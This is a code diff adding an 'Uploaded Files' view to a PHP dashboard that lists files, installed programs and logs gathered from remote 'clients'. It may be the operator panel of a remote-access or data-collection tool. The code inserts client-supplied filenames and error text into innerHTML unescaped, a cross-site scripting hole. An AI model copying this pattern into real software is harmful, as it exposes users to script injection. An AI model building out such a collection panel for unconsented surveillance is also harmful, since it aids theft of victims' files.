@@ -391,6 +391,40 @@ if (isset($_GET['get_installed_programs']) && $logged_in) {
     }
     exit;
 }
+
+if (isset($_GET['get_uploaded_files']) && $logged_in) {
+    header('Content-Type: application/json; charset=utf-8');
+    try {
+        // $stmt = $pdo->query("
+        //     SELECT id, client_id, message, created_at
+        //     FROM client_logs
+        //     WHERE log_type = 'file_upload'
+        //     ORDER BY created_at DESC LIMIT 100
+        // ");
+        $stmt = $pdo->query("
+    SELECT id, client_id, filename, file_path AS message, created_at
+    FROM client_files
+    ORDER BY created_at DESC LIMIT 100
+");
+        $file_logs = $stmt->fetchAll();
+
+        foreach ($file_logs as &$log) {
+            $log['message'] = $log['message'] ? decrypt($log['message'], Config::$ENCRYPTION_KEY) : '';
+            $log['file_data'] = json_decode($log['message'], true);
+            if ($log['file_data']['file_path']) {
+                $log['file_url'] = str_replace(__DIR__ . '/', '', $log['file_data']['file_path']);
+            } else {
+                $log['file_url'] = '';
+            }
+        }
+
+        echo json_encode(['file_logs' => $file_logs], JSON_UNESCAPED_UNICODE);
+    } catch (PDOException $e) {
+        error_log("Failed to fetch uploaded files: " . $e->getMessage(), 3, Config::$ERROR_LOG);
+        echo json_encode(['error' => 'Failed to fetch uploaded files: ' . htmlspecialchars($e->getMessage())], JSON_UNESCAPED_UNICODE);
+    }
+    exit;
+}
 ?>
 
 <!DOCTYPE html>
@@ -626,6 +660,10 @@ if (isset($_GET['get_installed_programs']) && $logged_in) {
                 <div class="glass-card rounded-xl p-6">
                     <h2 class="text-2xl font-semibold text-teal-400 mb-4">Installed Programs</h2>
                     <div id="installed-programs" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
+                </div>
+                <div class="glass-card rounded-xl p-6">
+                    <h2 class="text-2xl font-semibold text-teal-400 mb-4">Uploaded Files</h2>
+                    <div id="uploaded-files" class="space-y-4 max-h-[70vh] overflow-y-auto"></div>
                 </div>
             </div>
             <!-- Full-screen modal for logs -->
@@ -1118,6 +1156,40 @@ if (isset($_GET['get_installed_programs']) && $logged_in) {
                     document.getElementById('data-modal').style.display = 'none';
                 }
             });
+
+            function fetchUploadedFiles() {
+                fetch('?get_uploaded_files')
+                    .then(response => response.json())
+                    .then(data => {
+                        const fileContainer = document.getElementById('uploaded-files');
+                        fileContainer.innerHTML = '';
+                        if (data.error) {
+                            fileContainer.innerHTML = `<p class="text-red-400">${data.error}</p>`;
+                            return;
+                        }
+                        data.file_logs.forEach(file => {
+                            const fileData = file.file_data || {};
+                            const fileElement = document.createElement('div');
+                            fileElement.className = 'file-entry bg-gray-800 p-4 rounded-lg';
+                            fileElement.innerHTML = `
+                    <p><strong>Client ID:</strong> ${file.client_id}</p>
+                    <p><strong>Filename:</strong> ${fileData.filename || 'Unknown'}</p>
+                    <p><strong>Uploaded At:</strong> ${file.created_at}</p>
+                    ${file.file_url ? `<a href="${file.file_url}" download class="text-yellow-400 hover:underline">Download File</a>` : '<p class="text-red-400">File unavailable</p>'}
+                `;
+                            fileElement.addEventListener('click', () => {
+                                if (file.file_url) {
+                                    window.location.href = `?download_file&file_id=${file.id}`;
+                                }
+                            });
+                            fileContainer.appendChild(fileElement);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error fetching uploaded files:', error);
+                        document.getElementById('uploaded-files').innerHTML = '<p class="text-red-400">Error loading files</p>';
+                    });
+            }
 
             fetchLogsAndData();
             setInterval(fetchLogsAndData, 5000);
